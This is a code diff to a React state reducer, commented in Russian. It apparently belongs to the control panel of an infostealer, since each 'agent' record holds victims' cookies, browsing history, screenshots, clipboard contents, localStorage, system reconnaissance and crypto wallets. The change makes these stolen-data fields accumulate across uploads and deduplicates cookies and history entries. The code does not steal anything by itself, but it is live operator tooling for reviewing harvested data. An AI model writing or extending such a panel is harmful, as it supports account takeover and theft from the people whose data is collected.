@@ -1,4 +1,3 @@
-
 import React, { createContext, useContext, useReducer, useEffect, ReactNode } from 'react';
 
 interface AgentOverview {
@@ -77,15 +76,15 @@ function agentDataReducer(state: AgentDataState, action: AgentDataAction): Agent
           ...state.agentData,
           [action.payload.uid]: {
             overview: null,
-            cookies: null,
-            history: null,
-            screenshots: null,
-            clipboard: null,
+            cookies: [],
+            history: [],
+            screenshots: [],
+            clipboard: [],
             dom: null,
             localStorage: null,
             systemRecon: null,
             bookmarks: null,
-            wallets: null
+            wallets: []
           }
         }
       };
@@ -99,18 +98,78 @@ function agentDataReducer(state: AgentDataState, action: AgentDataAction): Agent
       console.log(`📊 UPDATE_AGENT_DATA: Agent=${agentUID}, Section=${section}, DataType=${typeof data}, DataLength=${Array.isArray(data) ? data.length : 'not array'}`);
       console.log('📊 Data content:', data);
       
+      const currentAgentData = state.agentData[agentUID] || {
+        overview: null,
+        cookies: [],
+        history: [],
+        screenshots: [],
+        clipboard: [],
+        dom: null,
+        localStorage: null,
+        systemRecon: null,
+        bookmarks: null,
+        wallets: []
+      };
+
+      let updatedSectionData;
+      const sectionKey = section.toLowerCase();
+
+      // Для массивов - накапливаем данные, для объектов - заменяем
+      if (Array.isArray(data) && Array.isArray(currentAgentData[sectionKey])) {
+        // Накапливаем массивы (cookies, history, screenshots, clipboard, wallets)
+        const existingData = currentAgentData[sectionKey] || [];
+        
+        if (sectionKey === 'cookies') {
+          // Для кукис - объединяем по уникальному ключу (domain + name)
+          const existingCookies = existingData;
+          const newCookies = data.filter(newCookie => 
+            !existingCookies.some(existing => 
+              existing.domain === newCookie.domain && existing.name === newCookie.name
+            )
+          );
+          updatedSectionData = [...existingCookies, ...newCookies];
+        } else if (sectionKey === 'history') {
+          // Для истории - объединяем по уникальному URL + timestamp
+          const existingHistory = existingData;
+          const newHistory = data.filter(newItem => 
+            !existingHistory.some(existing => 
+              existing.url === newItem.url && existing.lastVisitTime === newItem.lastVisitTime
+            )
+          );
+          updatedSectionData = [...existingHistory, ...newHistory];
+        } else if (sectionKey === 'screenshots') {
+          // Для скриншотов - объединяем по filename
+          const existingScreenshots = existingData;
+          const newScreenshots = data.filter(newScreenshot => 
+            !existingScreenshots.some(existing => 
+              existing.filename === newScreenshot.filename
+            )
+          );
+          updatedSectionData = [...existingScreenshots, ...newScreenshots];
+        } else {
+          // Для остальных массивов - просто добавляем новые элементы
+          updatedSectionData = [...existingData, ...data];
+        }
+        
+        console.log(`📊 Accumulated ${sectionKey}: ${existingData.length} existing + ${data.length} new = ${updatedSectionData.length} total`);
+      } else {
+        // Для не-массивов (overview, dom, localStorage, systemRecon, bookmarks) - заменяем
+        updatedSectionData = data;
+        console.log(`📊 Replaced ${sectionKey} with new data`);
+      }
+      
       const newState = {
         ...state,
         agentData: {
           ...state.agentData,
           [agentUID]: {
-            ...state.agentData[agentUID],
-            [section.toLowerCase()]: data
+            ...currentAgentData,
+            [sectionKey]: updatedSectionData
           }
         }
       };
       
-      console.log(`📊 After update - Agent ${agentUID} ${section}:`, newState.agentData[agentUID]?.[section.toLowerCase()]);
+      console.log(`📊 After update - Agent ${agentUID} ${section}:`, newState.agentData[agentUID]?.[sectionKey]);
       return newState;
 
     case 'UPDATE_AGENT_STATUS':
